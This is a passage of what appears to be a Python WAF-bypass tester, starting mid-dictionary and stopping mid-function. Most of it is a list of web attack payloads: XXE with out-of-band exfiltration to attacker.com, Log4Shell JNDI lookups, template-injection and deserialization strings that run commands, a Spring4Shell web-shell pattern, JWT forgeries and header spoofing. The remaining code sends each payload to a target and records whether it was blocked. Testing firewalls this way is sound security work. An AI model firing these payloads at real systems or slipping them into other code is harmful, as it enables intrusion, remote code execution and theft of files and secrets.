            "value": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">&xxe;</worksheet>",
        },
        {
            "name": "external_dtd_oob",
            "value": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]><data>&send;</data>",
        },
        {
            "name": "parameter_entity_trick",
            "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd \"<!ENTITY send SYSTEM 'http://attacker.com/?%xxe;'>\">%dtd;]><foo>&send;</foo>",
        },
        # --- NEW XXE ---
        {
            "name": "local_dtd_abuse",
            "value": "<?xml version=\"1.0\"?><!DOCTYPE message [<!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\"><!ENTITY % constant 'aaa'><!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">%eval;%error;]>",
        },
    ],
    "deserialization": [
        {"name": "php_serialized", "value": "O:8:\"stdClass\":1:{s:3:\"cmd\";s:2:\"id\";}"},
        {"name": "java_serialized_marker", "value": "rO0ABXNyAC5qYXZhLnV0aWwuQXJyYXlMaXN0xXuyrT0TAQMABHcEAAAAAXg="},
        {"name": "yaml_object", "value": "!!python/object/apply:os.system ['id']"},
        {"name": "ruby_marshal", "value": "0408553a0b4556494c5f434d4406"},
        {"name": "dotnet_viewstate", "value": "dDw8b2JqZWN0IGlkPSdPYmplY3QnPjwvYmplY3Q+"},
        {"name": "python_pickle", "value": "cos\nsystem\n(S'id'\ntR."},
        {"name": "node_iife", "value": "{\"rce\": \"_$$ND_FUNC$$_function (){require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });}()\"}"},
        {"name": "python_reduce", "value": "__import__('os').system('id')"},
        {"name": "java_commons", "value": "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ=="},
        {"name": "dotnet_typeconverter", "value": "<ObjectDataProvider MethodName=\"Start\" ObjectType=\"{x:Type diagnostics:Process}\" xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:diagnostics=\"clr-namespace:System.Diagnostics;assembly=System\"><ObjectDataProvider.MethodParameters><s:String xmlns:s=\"http://schemas.microsoft.com/winfx/2006/xaml\">cmd</s:String><s:String xmlns:s=\"http://schemas.microsoft.com/winfx/2006/xaml\">/c calc</s:String></ObjectDataProvider.MethodParameters></ObjectDataProvider>"},
        {"name": "php_unserialize_phar", "value": "O:8:\"stdClass\":1:{s:4:\"file\";s:12:\"phar://a.jpg\";}"},
        {"name": "ruby_yaml_tag", "value": "--- !ruby/object:Gem::Installer i: x\n--- !ruby/object:Gem::SpecFetcher i: y"},
        # --- NEW DESERIALIZATION ---
        {"name": "fastjson_gadget", "value": "{\"@type\":\"java.net.Inet4Address\",\"val\":\"dns.log.com\"}"},
        {"name": "jackson_gadget", "value": "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:\"}]"},
    ],
    "ssti": [
        {"name": "jinja2_rce", "value": "{{7*7}}"},
        {"name": "jinja2_config", "value": "{{config.items()}}"},
        {"name": "jinja2_class_walk", "value": "{{''.__class__.__mro__[1].__subclasses__()}}"},
        {"name": "jinja2_file_read", "value": "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"},
        {"name": "twig_rce", "value": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"},
        {"name": "twig_file_read", "value": "{{'/etc/passwd'|file_excerpt(1,30)}}"},
        {"name": "freemarker_rce", "value": "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }"},
        {"name": "velocity_rce", "value": "#set($str=$class.inspect(\"java.lang.String\").type)#set($chr=$class.inspect(\"java.lang.Character\").type)#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\"))"},
        {"name": "thymeleaf_rce", "value": "${T(java.lang.Runtime).getRuntime().exec('id')}"},
        {"name": "erb_rce", "value": "<%= system('id') %>"},
        {"name": "smarty_rce", "value": "{system('id')}"},
        {"name": "tornado_rce", "value": "{{__import__('os').system('id')}}"},
        {"name": "mako_rce", "value": "${__import__('os').system('id')}"},
        {"name": "pug_rce", "value": "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad('child_process').exec('id')}()}"},
        # --- NEW MODERN SSTI ---
        {"name": "spring_spel_exec", "value": "#{T(java.lang.Runtime).getRuntime().exec('id')}"},
        {"name": "spring_spel_map", "value": "${{'a':'b'}}"},
        {"name": "razor_net", "value": "@{System.Diagnostics.Process.Start(\"cmd.exe\", \"/c echo test\");}"},
        {"name": "python_fstring", "value": "{7*7}"},
        {"name": "ognl_struts", "value": "${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS}"},
        # --- 2024/2025 SSTI ---
        {"name": "jinja2_lipsum", "value": "{{lipsum.__globals__['os'].popen('id').read()}}"},
        {"name": "jinja2_cycler", "value": "{{cycler.__init__.__globals__.os.popen('id').read()}}"},
        {"name": "jinja2_namespace", "value": "{{namespace.__init__.__globals__.os.popen('id').read()}}"},
        {"name": "jinja2_request", "value": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"},
        {"name": "flask_config_secret", "value": "{{config['SECRET_KEY']}}"},
        {"name": "flask_debug_rce", "value": "{{self.__init__.__globals__.__builtins__['eval']('__import__(\"os\").system(\"id\")')}}"},
        {"name": "handlebars_rce", "value": "{{#with \"s\" as |string|}}\n  {{#with \"e\"}}{{#with split as |conslist|}}\n    {{this.pop}}\n    {{this.push (lookup string.sub \"constructor\")}}\n    {{this.pop}}\n    {{#with string.split as |codelist|}}\n      {{this.pop}}\n      {{this.push \"return require('child_process').execSync('id');\"}}\n      {{this.pop}}\n      {{#each conslist}}\n        {{#with (string.sub.apply 0 codelist)}}\n          {{this}}\n        {{/with}}\n      {{/each}}\n    {{/with}}\n  {{/with}}\n{{/with}}"},
        {"name": "nunjucks_rce", "value": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}"},
        {"name": "pebble_rce", "value": "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{(1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray())}}"},
        {"name": "groovy_rce", "value": "${'id'.execute().text}"},
        {"name": "expression_lang", "value": "${applicationScope}"},
    ],
    "crlf_injection": [
        {"name": "header_injection", "value": "%0d%0aSet-Cookie:%20admin=true"},
        {"name": "response_splitting", "value": "%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK"},
        {"name": "xss_via_crlf", "value": "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>"},
        {"name": "log_injection", "value": "admin%0d%0aINFO:%20Fake%20log%20entry"},
        {"name": "cache_deception", "value": "%0d%0aLocation:%20http://attacker.com"},
        {"name": "session_fixation", "value": "%0d%0aSet-Cookie:%20PHPSESSID=attacker_session"},
    ],
    "open_redirect": [
        {"name": "protocol_relative", "value": "//evil.com"},
        {"name": "backslash_trick", "value": "/\\evil.com"},
        {"name": "whitelist_bypass", "value": "https://trusted.com.evil.com"},
        {"name": "at_symbol", "value": "https://trusted.com@evil.com"},
        {"name": "encoded_slash", "value": "/%2f/evil.com"},
        {"name": "javascript_uri", "value": "javascript:alert(document.domain)"},
        {"name": "data_uri_redirect", "value": "data:text/html,<script>window.location='http://evil.com'</script>"},
        {"name": "dot_segment", "value": "https://trusted.com/../../../evil.com"},
        {"name": "null_byte", "value": "https://evil.com%00.trusted.com"},
        {"name": "crlf_redirect", "value": "/%0d/evil.com"},
        # --- NEW OPEN REDIRECT ---
        {"name": "double_url_encode_redirect", "value": "/%252fevil.com"},
        {"name": "unicode_normalization", "value": "https://evil｡com"},
    ],
    "jwt_attacks": [
        {"name": "none_algorithm", "value": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0."},
        {"name": "weak_secret", "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"},
        {"name": "rsa_confusion", "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ"},
        {"name": "kid_injection", "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJzdWIiOiJhZG1pbiJ9.Q"},
        {"name": "jku_injection", "value": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vand0In0.eyJzdWIiOiJhZG1pbiJ9.sig"},
        # --- 2024/2025 JWT ---
        {"name": "blank_password", "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9."},
        {"name": "x5u_injection", "value": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vY2VydCJ9.eyJzdWIiOiJhZG1pbiJ9.sig"},
        {"name": "x5c_injection", "value": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1YyI6WyJNSUlCa1RDQi1RSUJBREFOQmdrcWhraUc5dzBCQVFzRkFEQVJNUTh3RFFZRFZRUUREQW1WbWJXTnNZWE55TUJRR0NDc0dBUVVGQndNQk1Ba0dCU3NPQXdJYkJRQXdIUVlKS29aSWh2Y05BUW1CTUJBRURVaE5RVU00TmpReU1qUTNOd0l3R0lJQkFEQU5CZ2txaGtpRzl3MEJBUXNGQUFPQmdRQ3NNcUh0UUU3d2dkaHFqamNNUT09Il19.eyJzdWIiOiJhZG1pbiJ9.sig"},
        {"name": "cty_injection", "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImN0eSI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.sig"},
        {"name": "jwk_embedded", "value": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiLi4uIiwiZSI6IkFRQUIifX0.eyJzdWIiOiJhZG1pbiJ9.sig"},
    ],
    "xml_injection": [
        {"name": "xpath_injection", "value": "' or '1'='1"},
        {"name": "xpath_comment", "value": "admin' or 1=1 or 'a'='a"},
        {"name": "xpath_union", "value": "' | //user/password | '"},
        {"name": "xml_bomb_simple", "value": "<root><data>" + "A" * 10000 + "</data></root>"},
        {"name": "soap_array_overflow", "value": "<array><item>1</item><item>2</item></array>"},
        {"name": "cdata_injection", "value": "<![CDATA[<script>alert(1)</script>]]>"},
        # --- 2024/2025 XML ---
        {"name": "xpath_boolean_blind", "value": "' and substring(//user/password,1,1)='a"},
        {"name": "xpath_count", "value": "' and count(//user)>0 and 'a'='a"},
        {"name": "xquery_injection", "value": "for $x in doc(\"users.xml\")//user return $x/password"},
    ],
    "http_smuggling": [
        # --- HTTP Request Smuggling ---
        {"name": "cl_te_basic", "value": "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG", "raw_request": True},
        {"name": "te_cl_basic", "value": "POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n12\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n", "raw_request": True},
        {"name": "te_te_obfuscation", "value": "Transfer-Encoding: chunked\r\nTransfer-encoding: x", "header_name": "Transfer-Encoding"},
        {"name": "cl_cl_duplicate", "value": "Content-Length: 0\r\nContent-Length: 42", "header_name": "Content-Length"},
        {"name": "smuggle_via_0d", "value": "GET / HTTP/1.1\r\n\rHost: evil.com\r\n\r\n", "raw_request": True},
    ],
    "cors_bypass": [
        # --- CORS Bypass ---
        {"name": "null_origin", "header_name": "Origin", "value": "null"},
        {"name": "evil_origin", "header_name": "Origin", "value": "https://evil.com"},
        {"name": "subdomain_origin", "header_name": "Origin", "value": "https://target.com.evil.com"},
        {"name": "unicode_origin", "header_name": "Origin", "value": "https://tаrget.com"},
        {"name": "special_chars_origin", "header_name": "Origin", "value": "https://target.com%60.evil.com"},
        {"name": "http_downgrade", "header_name": "Origin", "value": "http://target.com"},
    ],
    "web_cache_poisoning": [
        # --- Web Cache Poisoning ---
        {"name": "x_forwarded_host_poison", "header_name": "X-Forwarded-Host", "value": "evil.com"},
        {"name": "x_host_poison", "header_name": "X-Host", "value": "evil.com"},
        {"name": "x_forwarded_scheme", "header_name": "X-Forwarded-Scheme", "value": "nothttps"},
        {"name": "x_original_url_poison", "header_name": "X-Original-URL", "value": "/admin"},
        {"name": "x_rewrite_url", "header_name": "X-Rewrite-URL", "value": "/admin"},
        {"name": "cache_key_param", "value": "?cb=1&utm_source=<script>alert(1)</script>"},
        {"name": "fat_get", "value": "__proto__[test]=polluted"},
    ],
    "log4j_spring": [
        # --- Log4j/Spring4Shell ---
        {"name": "log4j_basic", "value": "${jndi:ldap://attacker.com/a}"},
        {"name": "log4j_lower", "value": "${${lower:j}ndi:ldap://attacker.com/a}"},
        {"name": "log4j_upper", "value": "${${upper:j}ndi:ldap://attacker.com/a}"},
        {"name": "log4j_date", "value": "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}"},
        {"name": "log4j_env", "value": "${${env:NaN:-j}ndi:ldap://attacker.com/a}"},
        {"name": "log4j_base64", "value": "${${base64:amRuaTpsZGFwOi8vYXR0YWNrZXIuY29tL2E=}}"},
        {"name": "log4j_dns", "value": "${jndi:dns://attacker.com/a}"},
        {"name": "log4j_rmi", "value": "${jndi:rmi://attacker.com/a}"},
        {"name": "spring4shell_pattern", "header_name": "class.module.classLoader.resources.context.parent.pipeline.first.pattern", "value": "%{c2}i if(\"j\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();}"},
        {"name": "spring4shell_suffix", "header_name": "class.module.classLoader.resources.context.parent.pipeline.first.suffix", "value": ".jsp"},
        {"name": "spring4shell_directory", "header_name": "class.module.classLoader.resources.context.parent.pipeline.first.directory", "value": "webapps/ROOT"},
    ],
    "idor": [
        # --- IDOR/Auth Bypass ---
        {"name": "idor_numeric", "value": "1"},
        {"name": "idor_increment", "value": "2"},
        {"name": "idor_uuid", "value": "00000000-0000-0000-0000-000000000000"},
        {"name": "idor_negative", "value": "-1"},
        {"name": "idor_array", "value": "[1,2,3]"},
        {"name": "idor_wildcard", "value": "*"},
        {"name": "idor_admin", "value": "admin"},
        {"name": "idor_base64", "value": "eyJ1c2VyX2lkIjogMX0="},
    ],
    # --- COOKIE-BASED ATTACKS (2024/2025) ---
    "cookie_injection": [
        {"name": "sqli_cookie", "method": "cookie", "value": "' OR '1'='1"},
        {"name": "xss_cookie", "method": "cookie", "value": "<script>alert(document.cookie)</script>"},
        {"name": "path_traversal_cookie", "method": "cookie", "value": "../../../../etc/passwd"},
        {"name": "log4j_cookie", "method": "cookie", "value": "${jndi:ldap://attacker.com/a}"},
        {"name": "command_injection_cookie", "method": "cookie", "value": "; cat /etc/passwd"},
        {"name": "jwt_none_cookie", "method": "cookie", "value": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0."},
        {"name": "deserialization_cookie", "method": "cookie", "value": "O:8:\"stdClass\":1:{s:3:\"cmd\";s:2:\"id\";}"},
        {"name": "ssti_cookie", "method": "cookie", "value": "{{7*7}}"},
        {"name": "nosql_cookie", "method": "cookie", "value": "{\"$gt\": \"\"}"},
        {"name": "xxe_cookie", "method": "cookie", "value": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"},
    ],
    # --- JSON BODY ATTACKS (GraphQL, API) ---
    "json_body": [
        {"name": "graphql_introspection_body", "content_type": "json", "value": "{\"query\": \"{ __schema { types { name } } }\"}"},
        {"name": "graphql_batching_body", "content_type": "json", "value": "[{\"query\": \"{ user(id: 1) { name } }\"}, {\"query\": \"{ user(id: 2) { name } }\"}]"},
        {"name": "graphql_nested_body", "content_type": "json", "value": "{\"query\": \"{ a { a { a { a { a { a { a { a { a { a { id } } } } } } } } } } }\"}"},
        {"name": "sqli_json_body", "content_type": "json", "value": "{\"username\": \"admin'--\", \"password\": \"x\"}"},
        {"name": "nosql_json_body", "content_type": "json", "value": "{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}"},
        {"name": "prototype_pollution_body", "content_type": "json", "value": "{\"__proto__\": {\"admin\": true}}"},
        {"name": "constructor_pollution_body", "content_type": "json", "value": "{\"constructor\": {\"prototype\": {\"admin\": true}}}"},
        {"name": "command_injection_body", "content_type": "json", "value": "{\"cmd\": \"; cat /etc/passwd\"}"},
        {"name": "ssti_json_body", "content_type": "json", "value": "{\"template\": \"{{7*7}}\"}"},
        {"name": "xss_json_body", "content_type": "json", "value": "{\"name\": \"<script>alert(1)</script>\"}"},
        {"name": "path_traversal_body", "content_type": "json", "value": "{\"file\": \"../../../../etc/passwd\"}"},
        {"name": "ssrf_json_body", "content_type": "json", "value": "{\"url\": \"http://169.254.169.254/latest/meta-data/\"}"},
        {"name": "log4j_json_body", "content_type": "json", "value": "{\"data\": \"${jndi:ldap://attacker.com/a}\"}"},
        {"name": "jwt_forgery_body", "content_type": "json", "value": "{\"token\": \"eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.\"}"},
        {"name": "mass_assignment_body", "content_type": "json", "value": "{\"username\": \"user\", \"role\": \"admin\", \"isAdmin\": true}"},
        {"name": "type_juggling_body", "content_type": "json", "value": "{\"password\": true}"},
        {"name": "array_injection_body", "content_type": "json", "value": "{\"id\": [1, 2, 3, 4, 5]}"},
    ],
    # --- XML BODY ATTACKS (XXE, SOAP) ---
    "xml_body": [
        {"name": "xxe_external_entity", "content_type": "xml", "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"},
        {"name": "xxe_parameter_entity", "content_type": "xml", "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo>test</foo>"},
        {"name": "xxe_billion_laughs", "content_type": "xml", "value": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><lolz>&lol2;</lolz>"},
        {"name": "soap_xxe", "content_type": "xml", "value": "<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Body><data>&xxe;</data></soap:Body></soap:Envelope>"},
        {"name": "xinclude_body", "content_type": "xml", "value": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>"},
        {"name": "svg_xxe_body", "content_type": "xml", "value": "<svg xmlns=\"http://www.w3.org/2000/svg\"><desc><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>&xxe;</desc></svg>"},
        {"name": "xslt_injection", "content_type": "xml", "value": "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" version=\"1.0\"><xsl:template match=\"/\"><xsl:value-of select=\"document('file:///etc/passwd')\"/></xsl:template></xsl:stylesheet>"},
        {"name": "xml_sqli", "content_type": "xml", "value": "<user><name>admin'--</name><password>x</password></user>"},
        {"name": "xml_xss", "content_type": "xml", "value": "<user><name><![CDATA[<script>alert(1)</script>]]></name></user>"},
        {"name": "dtd_oob", "content_type": "xml", "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\">%xxe;%data;]><foo>&send;</foo>"},
    ],
    "headers": [
        {"name": "x_original_url", "header_name": "X-Original-URL", "value": "/../../etc/passwd"},
        {"name": "x_forwarded_for_local", "header_name": "X-Forwarded-For", "value": "127.0.0.1"},
        {"name": "x_custom_large", "header_name": "X-Custom-Blob", "value": "A" * 2048},
        {"name": "x_override_host", "header_name": "X-Host", "value": "127.0.0.1"},
        {"name": "forwarded_header", "header_name": "Forwarded", "value": "for=127.0.0.1;host=internal"},
        {"name": "shellshock_ua", "header_name": "User-Agent", "value": "() { :; }; /bin/eject"},
        {"name": "log4j_ua", "header_name": "User-Agent", "value": "${jndi:ldap://127.0.0.1/a}"},
        {"name": "sqli_cookie", "header_name": "Cookie", "value": "session_id=' OR '1'='1"},
        {"name": "xss_referer", "header_name": "Referer", "value": "https://google.com/<script>alert(1)</script>"},
        {"name": "host_header_injection", "header_name": "Host", "value": "attacker.com"},
        {"name": "x_real_ip_ssrf", "header_name": "X-Real-IP", "value": "127.0.0.1"},
        {"name": "client_ip_spoof", "header_name": "Client-IP", "value": "127.0.0.1"},
        {"name": "true_client_ip", "header_name": "True-Client-IP", "value": "127.0.0.1"},
        {"name": "x_wap_profile_xxe", "header_name": "X-Wap-Profile", "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"},
        {"name": "accept_xxe", "header_name": "Accept", "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"},
        {"name": "content_type_xxe", "header_name": "Content-Type", "value": "application/xml; charset=UTF-7"},
        {"name": "crlf_injection", "header_name": "Location", "value": "http://example.com/%0d%0aSet-Cookie:%20admin=true"},
        {"name": "http_request_smuggling", "header_name": "Transfer-Encoding", "value": "chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost"},
        {"name": "cache_poisoning", "header_name": "X-Forwarded-Host", "value": "evil.com"},
        # --- 2024/2025 HEADER ATTACKS ---
        {"name": "log4j_obfuscated", "header_name": "X-Api-Version", "value": "${${::-j}ndi:ldap://127.0.0.1/a}"},
        {"name": "spring4shell", "header_name": "class.module.classLoader.resources.context.parent.pipeline.first.pattern", "value": "%{prefix}i"},
        {"name": "cf_connecting_ip", "header_name": "CF-Connecting-IP", "value": "127.0.0.1"},
        {"name": "x_azure_clientip", "header_name": "X-Azure-ClientIP", "value": "127.0.0.1"},
        {"name": "x_cluster_client_ip", "header_name": "X-Cluster-Client-IP", "value": "127.0.0.1"},
        {"name": "x_client_ip", "header_name": "X-Client-IP", "value": "127.0.0.1"},
        {"name": "x_remote_ip", "header_name": "X-Remote-IP", "value": "127.0.0.1"},
        {"name": "x_remote_addr", "header_name": "X-Remote-Addr", "value": "127.0.0.1"},
        {"name": "host_override", "header_name": "X-Forwarded-Server", "value": "evil.com"},
        {"name": "x_http_method_override", "header_name": "X-HTTP-Method-Override", "value": "PUT"},
        {"name": "x_method_override", "header_name": "X-Method-Override", "value": "DELETE"},
        {"name": "range_dos", "header_name": "Range", "value": "bytes=0-,5-0,5-1,5-2,5-3,5-4,5-5,5-6,5-7,5-8,5-9"},
        {"name": "accept_language_sqli", "header_name": "Accept-Language", "value": "en-US' OR '1'='1"},
    ],
}

BLOCK_STATUS = {401, 403, 406, 429}
BLOCK_KEYWORDS = [
    "access denied",
    "forbidden",
    "waf",
    "mod_security",
    "blocked",
    "not allowed",
    "security incident",
    "request blocked",
    "illegal request",
    # NOT included: "bad request", "invalid request" - these are HTTP errors, not WAF blocks
    "cloudflare",
    "akamai",
    "sucuri",
    "imperva",
    "f5 big-ip",
    "barracuda",
    "aws waf",
    "azure waf",
    "fortigate",
    "attack detected",
    "malicious",
    "sql injection",
    "xss detected",
]

# Constants
TIMEOUT = 10
PARAM_NAME = "q"


def detect_blocked(status_code: int, body: str) -> Tuple[str, str]:
    """
    Check request result and categorize it.
    
    Returns: (result, reason)
        result: 'blocked' | 'passed' | 'error'
        - 'blocked': WAF blocked the request (403, 401, 406, 429, or WAF keywords)
        - 'passed': Request went through successfully (2xx status) - POTENTIAL VULNERABILITY
        - 'error': Request failed due to error (4xx client error, 5xx server error)
    """
    # WAF block status codes
    if status_code in BLOCK_STATUS:
        return "blocked", f"WAF status {status_code}"
    
    # Check for WAF keywords in body
    lower_body = (body or "").lower()
    for kw in BLOCK_KEYWORDS:
        if kw in lower_body:
            return "blocked", f"WAF keyword '{kw}'"
    
    # 2xx = Success = Payload passed through = POTENTIAL VULNERABILITY
    if 200 <= status_code < 300:
        return "passed", f"success {status_code}"
    
    # 4xx (except WAF codes) = Client error (bad request, not found, etc.)
    if 400 <= status_code < 500:
        return "error", f"client error {status_code}"
    
    # 5xx = Server error
    if status_code >= 500:
        return "error", f"server error {status_code}"
    
    # 3xx redirects - treat as passed (might be open redirect)
    if 300 <= status_code < 400:
        return "passed", f"redirect {status_code}"
    
    return "error", f"unknown status {status_code}"


def send_payload(session: requests.Session, url: str, category: str, payload: Payload) -> Dict[str, Any]:
    """
    Send payload using appropriate method based on payload type and delivery method.
    
    Delivery methods (determined by payload properties):
    1. header_name     → GET request with payload in HTTP header
    2. content_type: json → POST with application/json body
    3. content_type: xml  → POST with application/xml body  
    4. method: path    → GET with payload in URL path
    5. method: cookie  → GET with payload in Cookie header
    6. method: PUT/DELETE → respective HTTP method with payload in body
    7. default         → test BOTH GET (query param) AND POST (form body)
    
    Returns dict with: category, name, status, result (blocked/passed/error/skipped), reason, method, response_body
    """
    headers: Dict[str, str] = {}
    
    def make_result(status, result, reason, method, body=""):
        """Helper to create result dict with truncated body
        result: 'blocked' | 'passed' | 'error' | 'skipped'
        """
        return {
            "category": category, 
            "name": payload["name"], 
            "payload_value": str(payload.get("value", ""))[:200],
            "status": status, 
            "result": result,  # blocked, passed, error, skipped
            "reason": reason, 
            "method": method,
            "response_body": (body or "")[:500]  # Truncate body to 500 chars
        }
    
    # 1. HEADER-BASED PAYLOADS
    # Payload is injected into a specific HTTP header
    if "header_name" in payload:
        header_name = payload["header_name"]
        headers[header_name] = str(payload["value"])
        try:
            resp = session.get(url, params={PARAM_NAME: "test"}, headers=headers, timeout=TIMEOUT)
            result, reason = detect_blocked(resp.status_code, resp.text)
            return make_result(resp.status_code, result, reason, f"GET+Header:{header_name}", resp.text)
        except (requests.RequestException, UnicodeEncodeError) as exc:
            return make_result(None, "error", str(exc)[:50], f"GET+Header:{header_name}", str(exc))
    
    # 2. RAW REQUEST PAYLOADS (HTTP Smuggling)
    # These need socket-level access, skip for now
    if payload.get("raw_request"):
        return make_result(None, "skipped", "requires socket-level", "RAW", "")
    
    # 3. JSON BODY PAYLOADS
    # Sent as POST with Content-Type: application/json
    if payload.get("content_type") == "json":
        try:
            headers["Content-Type"] = "application/json"
            resp = session.post(url, data=payload["value"], headers=headers, timeout=TIMEOUT)
            result, reason = detect_blocked(resp.status_code, resp.text)
            return make_result(resp.status_code, result, reason, "POST+JSON", resp.text)
        except (requests.RequestException, UnicodeEncodeError) as exc:
            return make_result(None, "error", str(exc)[:50], "POST+JSON", str(exc))
    
    # 4. XML BODY PAYLOADS (XXE)
    # Sent as POST with Content-Type: application/xml
    if payload.get("content_type") == "xml" or category == "xxe":
        try:
            headers["Content-Type"] = "application/xml"
            resp = session.post(url, data=payload["value"], headers=headers, timeout=TIMEOUT)
            result, reason = detect_blocked(resp.status_code, resp.text)
            return make_result(resp.status_code, result, reason, "POST+XML", resp.text)
        except (requests.RequestException, UnicodeEncodeError) as exc:
            return make_result(None, "error", str(exc)[:50], "POST+XML", str(exc))
    
    # 5. PATH-BASED PAYLOADS (Path Traversal, LFI)
    # Payload is injected into URL path AND query param
    if payload.get("method") == "path" or category == "path_traversal_lfi":
        results_lfi = []
        
        # Test 1: Payload in URL path (http://host/../../etc/passwd)
        # Skip path test for payloads with problematic chars that cause 400
        payload_val = payload["value"]
        skip_path = "%00" in payload_val or payload_val.startswith("php://") or payload_val.startswith("data://")
        
        if not skip_path:
            try:
                path_url = url.rstrip("/") + "/" + payload_val
                resp = session.get(path_url, timeout=TIMEOUT)
                result, reason = detect_blocked(resp.status_code, resp.text)
                results_lfi.append(("PATH", result, reason, resp.status_code, resp.text))
            except (requests.RequestException, UnicodeEncodeError) as exc:
                results_lfi.append(("PATH", "error", str(exc)[:30], None, ""))
        
        # Test 2: Payload in query param (?file=../../etc/passwd)
        try:
            resp = session.get(url, params={"file": payload_val}, timeout=TIMEOUT)
            result, reason = detect_blocked(resp.status_code, resp.text)
            results_lfi.append(("QUERY", result, reason, resp.status_code, resp.text))
        except (requests.RequestException, UnicodeEncodeError) as exc:
            results_lfi.append(("QUERY", "error", str(exc)[:30], None, ""))
        
        # Test 3: Payload in POST body
        try:
